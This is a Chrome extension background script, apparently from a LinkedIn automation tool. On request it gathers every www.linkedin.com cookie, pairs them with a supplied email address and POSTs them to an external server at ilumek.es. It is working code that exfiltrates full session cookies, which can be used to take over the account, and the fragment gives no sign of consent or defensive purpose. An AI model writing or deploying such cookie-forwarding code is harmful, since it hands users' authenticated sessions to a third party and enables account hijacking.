chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    
    const email = request.email

    if (request.action === "getCookies") {
        chrome.cookies.getAll({domain: "www.linkedin.com"}, (cookies) => {

            data = {
                "cookies": cookies,
                "email": email
            }

            fetch("https://ilumek.es/api/automate-with-cookies", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                credentials: "include",
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                sendResponse({message: "Cookies enviadas correctamente"});
            })
            .catch(error => console.error("Error enviando cookies:", error));
        });

        return true;  // Necesario para `sendResponse` asincrónico
    }
});
